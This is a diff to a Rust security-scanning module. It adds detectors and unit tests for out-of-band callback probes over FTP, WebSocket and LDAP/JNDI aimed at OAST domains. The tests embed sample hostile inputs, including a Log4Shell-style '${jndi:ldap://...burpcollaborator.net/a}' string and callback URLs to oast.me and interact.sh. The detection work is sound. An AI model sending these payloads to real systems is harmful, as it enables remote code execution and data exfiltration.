@@ -107,6 +107,15 @@ impl L2Evaluator for OastEvaluator {
         if let Some(det) = detect_oast_smtp_injection(&decoded) {
             dets.push(det);
         }
+        if let Some(det) = detect_oast_ftp_dns_probe(&decoded) {
+            dets.push(det);
+        }
+        if let Some(det) = detect_oast_websocket_upgrade_probe(&decoded) {
+            dets.push(det);
+        }
+        if let Some(det) = detect_oast_ldap_callback_injection(&decoded) {
+            dets.push(det);
+        }
 
         dets
     }
@@ -117,7 +126,10 @@ impl L2Evaluator for OastEvaluator {
             | "oast_dns_exfil"
             | "oast_http_ssrf"
             | "oast_smb_exfil"
-            | "oast_smtp_injection" => Some(InvariantClass::OastInteraction),
+            | "oast_smtp_injection"
+            | "oast_ftp_dns_probe"
+            | "oast_websocket_upgrade_probe"
+            | "oast_ldap_callback_injection" => Some(InvariantClass::OastInteraction),
             _ => None,
         }
     }
@@ -260,6 +272,88 @@ fn detect_oast_smtp_injection(input: &str) -> Option<RustDetection> {
     })
 }
 
+fn detect_oast_ftp_dns_probe(input: &str) -> Option<RustDetection> {
+    let domains = OAST_DOMAINS
+        .iter()
+        .map(|d| regex::escape(d))
+        .collect::<Vec<_>>()
+        .join("|");
+    let pattern = format!(r#"(?i)\bftp://[a-z0-9._%-]*?(?:{})\b[^\s"'<>]*"#, domains);
+    let re = Regex::new(&pattern).ok()?;
+    let m = re.find(input)?;
+    Some(RustDetection {
+        detection_type: "oast_ftp_dns_probe".into(),
+        confidence: 0.89,
+        detail: "FTP callback URL points to OAST domain".into(),
+        position: m.start(),
+        evidence: vec![ProofEvidence {
+            operation: EvidenceOperation::PayloadInject,
+            matched_input: m.as_str().to_string(),
+            interpretation: "FTP scheme callback toward OAST infrastructure indicates out-of-band probe/exfiltration over non-HTTP protocol.".into(),
+            offset: m.start(),
+            property: "Restrict server-side URL fetchers by protocol and block outbound callbacks to known OAST infrastructure.".into(),
+        }],
+    })
+}
+
+fn detect_oast_websocket_upgrade_probe(input: &str) -> Option<RustDetection> {
+    let domains = OAST_DOMAINS
+        .iter()
+        .map(|d| regex::escape(d))
+        .collect::<Vec<_>>()
+        .join("|");
+    let ws_re = Regex::new(&format!(
+        r#"(?i)\b(?:ws|wss)://[a-z0-9._%-]*?(?:{})\b[^\s"'<>]*"#,
+        domains
+    ))
+    .ok()?;
+    let upgrade_re = Regex::new(r#"(?i)\bupgrade\s*:\s*websocket\b"#).ok()?;
+    let ws_match = ws_re.find(input)?;
+    if !(upgrade_re.is_match(input) || input.contains("sec-websocket-key")) {
+        return None;
+    }
+    Some(RustDetection {
+        detection_type: "oast_websocket_upgrade_probe".into(),
+        confidence: 0.87,
+        detail: "WebSocket upgrade probe references OAST host".into(),
+        position: ws_match.start(),
+        evidence: vec![ProofEvidence {
+            operation: EvidenceOperation::SemanticEval,
+            matched_input: ws_match.as_str().to_string(),
+            interpretation: "Payload attempts WebSocket connectivity/upgrade to OAST infrastructure, a blind callback channel beyond standard HTTP probes.".into(),
+            offset: ws_match.start(),
+            property: "Validate outbound WebSocket destinations and deny upgrades to attacker-controlled callback domains.".into(),
+        }],
+    })
+}
+
+fn detect_oast_ldap_callback_injection(input: &str) -> Option<RustDetection> {
+    let domains = OAST_DOMAINS
+        .iter()
+        .map(|d| regex::escape(d))
+        .collect::<Vec<_>>()
+        .join("|");
+    let ldap_re = Regex::new(&format!(
+        r#"(?i)(?:\$\{{jndi:(?:ldap|ldaps)://|(?:ldap|ldaps)://)[^/\s"'<>]*?(?:{})\b[^\s"'<>]*"#,
+        domains
+    ))
+    .ok()?;
+    let m = ldap_re.find(input)?;
+    Some(RustDetection {
+        detection_type: "oast_ldap_callback_injection".into(),
+        confidence: 0.94,
+        detail: "LDAP/JNDI callback target references OAST domain".into(),
+        position: m.start(),
+        evidence: vec![ProofEvidence {
+            operation: EvidenceOperation::PayloadInject,
+            matched_input: m.as_str().to_string(),
+            interpretation: "LDAP callback URI to OAST domain matches JNDI-style out-of-band probing used for blind code execution and exfil verification.".into(),
+            offset: m.start(),
+            property: "Block JNDI/LDAP lookups from untrusted input and enforce egress controls on directory protocols.".into(),
+        }],
+    })
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -347,5 +441,34 @@ mod tests {
         let eval = OastEvaluator;
         let dets = eval.detect("RCPT TO:<user@example.org>");
         assert!(!dets.iter().any(|d| d.detection_type == "oast_smtp_injection"));
+    }
+
+    #[test]
+    fn detects_ftp_dns_probe_on_oast_domain() {
+        let eval = OastEvaluator;
+        let dets = eval.detect("ftp://collector.oast.me/ping.txt");
+        assert!(dets.iter().any(|d| d.detection_type == "oast_ftp_dns_probe"));
+    }
+
+    #[test]
+    fn detects_websocket_upgrade_probe_oast() {
+        let eval = OastEvaluator;
+        let dets = eval.detect(
+            "GET /chat HTTP/1.1\r\nHost: app\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: x\r\n\r\nws://probe.interact.sh/socket",
+        );
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "oast_websocket_upgrade_probe")
+        );
+    }
+
+    #[test]
+    fn detects_ldap_callback_injection() {
+        let eval = OastEvaluator;
+        let dets = eval.detect("${jndi:ldap://a1.burpcollaborator.net/a}");
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "oast_ldap_callback_injection")
+        );
     }
 }
